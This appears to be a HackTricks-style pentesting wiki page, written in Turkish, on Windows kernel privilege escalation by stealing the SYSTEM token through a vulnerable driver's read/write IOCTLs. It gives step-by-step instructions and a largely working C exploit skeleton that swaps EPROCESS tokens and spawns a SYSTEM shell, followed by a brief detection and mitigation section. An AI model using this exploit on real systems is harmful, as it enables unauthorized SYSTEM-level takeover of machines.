# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Eğer bir vuln driver, saldırgana arbitrary kernel read ve/veya write primitive’leri sağlayan bir IOCTL açıyorsa, NT AUTHORITY\SYSTEM yetkisine yükselme genellikle bir SYSTEM access Token’ı çalarak gerçekleştirilebilir. Teknik, SYSTEM process’in EPROCESS’indeki Token pointer’ını mevcut process’in EPROCESS’ine kopyalar.

Neden işe yarar:
- Her process’in içinde (diğer alanlar arasında) bir Token içeren bir EPROCESS yapısı vardır (aslında bir EX_FAST_REF to a token object).
- SYSTEM process (PID 4) tüm ayrıcalıkları etkinleştirilmiş bir token’a sahiptir.
- Mevcut process’in EPROCESS.Token’ını SYSTEM token pointer’ı ile değiştirmek, mevcut process’in hemen SYSTEM olarak çalışmasını sağlar.

> EPROCESS içindeki offset’ler Windows sürümleri arasında değişir. Bunları dinamik olarak belirleyin (symbols) veya sürüme özel sabitler kullanın. Ayrıca EPROCESS.Token’ın bir EX_FAST_REF olduğunu unutmayın (alt 3 bit referans sayacı bayraklarıdır).

## Yüksek seviyeli adımlar

1) ntoskrnl.exe base’ini bulun ve PsInitialSystemProcess adresini çözün.
- User mode’dan, yüklenmiş driver bazlarını almak için NtQuerySystemInformation(SystemModuleInformation) veya EnumDeviceDrivers kullanın.
- Kernel base’e PsInitialSystemProcess offset’ini (symbols/reversing’den) ekleyerek adresini elde edin.
2) PsInitialSystemProcess’teki pointer’ı okuyun → bu SYSTEM’in EPROCESS’ine işaret eden bir kernel pointer’ıdır.
3) SYSTEM EPROCESS’inden UniqueProcessId ve ActiveProcessLinks offset’lerini okuyarak EPROCESS yapılarını doubly linked list halinde (ActiveProcessLinks.Flink/Blink) dolaşın; UniqueProcessId’nin GetCurrentProcessId() ile eşit olduğu EPROCESS’i bulana kadar devam edin. Her iki adresi saklayın:
- EPROCESS_SYSTEM (SYSTEM için)
- EPROCESS_SELF (mevcut process için)
4) SYSTEM token değerini okuyun: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Alt 3 biti maskeleyin: Token_SYS_masked = Token_SYS & ~0xF (genelde ~0xF veya build’e bağlı olarak ~0x7; x64’te alt 3 bit kullanılır — 0xFFFFFFFFFFFFFFF8 mask).
5) Seçenek A (yaygın): Gömülü referans sayısını tutarlı kılmak için mevcut token’ınızın alt 3 bitini koruyun ve SYSTEM’in pointer’ına ekleyin.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Kernel write primitive’inizi kullanarak Token_NEW’i (EPROCESS_SELF + TokenOffset) adresine geri yazın.
7) Mevcut process’iniz artık SYSTEM. Doğrulamak için opsiyonel olarak yeni bir cmd.exe veya powershell.exe spawn edebilirsiniz.

## Pseudokod

Aşağıda sadece vuln driver’dan iki IOCTL kullanan iskelet bir örnek verilmiştir; biri 8-byte kernel read, diğeri 8-byte kernel write içindir. Kendi driver arayüzünüzle değiştirin.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notlar:
- Ofsetler: Doğru ofsetleri almak için hedefin PDBs'i ile veya bir runtime symbol loader ile WinDbg’in `dt nt!_EPROCESS` komutunu kullanın. Hardcode yapmayın.
- Maske: x64'te token bir EX_FAST_REF'tir; düşük 3 bit referans sayısı bitleridir. Tokenınızdan orijinal düşük bitleri korumak, anlık refcount tutarsızlıklarını önler.
- Kararlılık: Mevcut süreci yükseltmeyi tercih edin; kısa ömürlü bir yardımcıyı yükseltirseniz, o süreç sonlandığında SYSTEM'i kaybedebilirsiniz.

## Tespit ve hafifletme
- Güçlü IOCTLs açığa çıkaran imzalanmamış veya güvenilmeyen üçüncü taraf sürücülerin yüklenmesi temel nedendir.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard ve Attack Surface Reduction kuralları zayıf sürücülerin yüklenmesini engelleyebilir.
- EDR, arbitrary read/write uygulayan ve token swaps içeren şüpheli IOCTL dizilerini izleyebilir.

## Referanslar
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
